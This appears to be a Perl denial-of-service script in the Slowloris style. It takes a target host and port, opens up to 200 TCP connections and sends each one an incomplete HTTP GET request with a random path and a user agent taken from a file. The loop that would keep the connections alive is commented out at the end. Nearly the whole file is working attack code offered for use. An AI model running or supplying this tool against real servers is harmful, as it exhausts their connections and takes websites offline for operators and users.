#!/usr/bin/perl

use strict;
use warnings;

use Getopt::Long;
use Socket;

my $target;
my $port=80;
my $socketc=200;
my $sleeptime=1;
my $verbose='';


GetOptions("target=s" => \$target,
	"port=i" => \$port,
	"socketc=i" => \$socketc,
	"sleeptime=i" => \$sleeptime,
	"verbose" => \$verbose)
	or die "Error in command line arguments";


my $agent_file = 'Agents';
my (@agents,$fh);
open($fh, '<:encoding(UTF-8)', $agent_file) or die "Could not open file $agent_file $!";
while(my $row =<$fh>){
	chomp $row;
	push @agents,$row;
}
close $fh;

my @sockets;
my $proto=getprotobyname('tcp');
my $iaddr=inet_aton($target) or die "Unable to connect to hostname";
my $paddr=sockaddr_in($port,$iaddr);

for(1..$socketc){
	socket($sockets[$_],AF_INET,SOCK_STREAM,$proto) or die $!;
	connect($sockets[$_],$paddr) or die "Couldn't connect the socket: $!";
	send($sockets[$_],"GET /".int(rand(2000))." HTTP/1.1\r\n",0);
	send($sockets[$_],"User-Agent: ".$agents[rand(@agents)]."\r\n",0);
	send($sockets[$_],"Accept-language: en-US,en,q=0.5\r\n",0);
	if($verbose){
		print "$_ socket created, connected, sent the Header.\n";
	}
}
print "All $socketc are connected and they attack $target.";


# for(;;){
# 	foreach (@sockets){
# 		# send($_,"X-a: ".int(rand(5000))."\r\n",0);
# 		# send($_,"X-a: ".int(rand(5000))."\r\n",0)  or splice(@sockets,1,1);
# 		}
# 	my $diff=@sockets;
# 	for($diff..($socketc-$diff)){
#         socket($sockets[$_],AF_INET,SOCK_STREAM,$proto) or die $!;
#         connect($sockets[$_],$paddr) or die "Couldn't connect the socket: $!";
#         send($sockets[$_],"GET /".int(rand(2000))." HTTP/1.1\r\n",0);
#         send($sockets[$_],"User-Agent: ".$agents[rand(@agents)]."\r\n",0);
#         send($sockets[$_],"Accept-language: en-US,en,q=0.5\r\n",0);
#         if($verbose){
#             print "$_ socket created, connected, sent the Header.";
#         }
# 	}
# 	# for(1..$socketc){
# 	# send($sockets[$_],"X-a: ".int(rand(5000))."\r\n",0);
# 	# # print "Sent.";
# 	# }
# 	# print "Sleeping for $sleeptime";
# 	# sleep $sleeptime;
# }
